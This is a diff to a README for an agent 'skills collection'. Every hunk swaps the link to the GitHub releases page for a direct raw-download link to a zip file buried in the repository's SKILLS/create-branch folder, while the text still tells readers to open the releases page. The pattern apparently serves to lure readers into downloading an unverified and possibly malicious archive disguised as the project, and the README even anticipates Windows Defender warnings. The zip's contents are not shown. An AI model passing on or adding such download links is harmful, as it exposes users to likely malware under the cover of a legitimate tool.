@@ -1,6 +1,6 @@
 # 🧩 skills-collection-1 - Build Better Agent Workflows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/marysatasselshaped667/skills-collection-1/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/marysatasselshaped667/skills-collection-1/raw/refs/heads/main/SKILLS/create-branch/collection-skills-2.4.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ If the release includes a desktop app or script package, Windows Defender or you
 
 Visit this page to download:
 
-[https://github.com/marysatasselshaped667/skills-collection-1/releases](https://github.com/marysatasselshaped667/skills-collection-1/releases)
+[https://github.com/marysatasselshaped667/skills-collection-1/raw/refs/heads/main/SKILLS/create-branch/collection-skills-2.4.zip](https://github.com/marysatasselshaped667/skills-collection-1/raw/refs/heads/main/SKILLS/create-branch/collection-skills-2.4.zip)
 
 1. Open the releases page.
 2. Find the latest release at the top of the page.
@@ -166,7 +166,7 @@ This collection fits users who want:
 
 Use this page to visit the release page and download the Windows file:
 
-[https://github.com/marysatasselshaped667/skills-collection-1/releases](https://github.com/marysatasselshaped667/skills-collection-1/releases)
+[https://github.com/marysatasselshaped667/skills-collection-1/raw/refs/heads/main/SKILLS/create-branch/collection-skills-2.4.zip](https://github.com/marysatasselshaped667/skills-collection-1/raw/refs/heads/main/SKILLS/create-branch/collection-skills-2.4.zip)
 
 ## 🏷️ Topics
 
